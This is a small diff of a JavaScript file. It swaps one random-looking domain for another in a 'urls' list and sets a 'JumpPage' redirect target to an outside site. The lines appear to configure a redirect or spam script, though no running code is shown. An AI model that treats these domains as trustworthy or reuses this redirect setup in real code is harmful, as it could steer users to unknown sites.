@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'drapietsl.cc',
+	'gyiveczsz.com',
 ];
                                                                                                                   
 var JumpPage="https://91nt.com";
